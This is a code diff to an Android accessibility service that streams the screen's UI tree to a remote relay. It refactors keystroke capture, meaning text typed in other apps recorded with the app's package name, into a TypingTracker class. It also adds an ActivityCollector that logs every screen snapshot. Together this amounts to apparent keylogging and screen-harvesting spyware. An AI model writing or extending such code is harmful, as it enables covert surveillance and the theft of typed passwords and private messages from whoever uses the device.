@@ -55,6 +55,7 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
     }
 
     override fun onDestroy() {
+        ActivityCollector.get(this).stop()
         unregisterNetworkWatcher()
         relay?.disconnect()
         relay = null
@@ -103,20 +104,7 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
     }
 
     private fun captureTextChange(event: AccessibilityEvent) {
-        val after = event.text?.joinToString("").orEmpty()
-        if (after.isEmpty()) return
-        val before = event.beforeText?.toString().orEmpty()
-        val added = when {
-            after.length > before.length && after.startsWith(before) ->
-                after.substring(before.length)
-            event.addedCount > 0 ->
-                after.takeLast(event.addedCount.coerceAtMost(after.length))
-            before.isEmpty() && after.isNotEmpty() -> after
-            else -> return
-        }
-        if (added.isBlank()) return
-        val pkg = event.packageName?.toString()?.ifBlank { null } ?: lastWindowPkg
-        NotesStore.append(this, added, "keyboard", pkg)
+        TypingTracker.onTextChanged(this, event, lastWindowPkg)
     }
 
     override fun onInterrupt() {}
@@ -174,6 +162,7 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
         RelayHub.client = relay
         relay?.sendMeta(RelayHub.screenWidth, RelayHub.screenHeight)
         relay?.sendMode("tree")
+        ActivityCollector.get(this).start()
         if (!streaming) startStreaming()
         else pushTreeNow(forceFull = true)
     }
@@ -252,6 +241,7 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
             val json = snapshotTree(forceFull) ?: return
             val out = TreeDiffer.diff(json) ?: return
             RelayHub.client?.sendJson(out)
+            ActivityCollector.get(this).onTree(json, lastWindowPkg)
             lastTreeAt = System.currentTimeMillis()
         } catch (e: Exception) {
             Log.w(TAG, e.message ?: "tree")
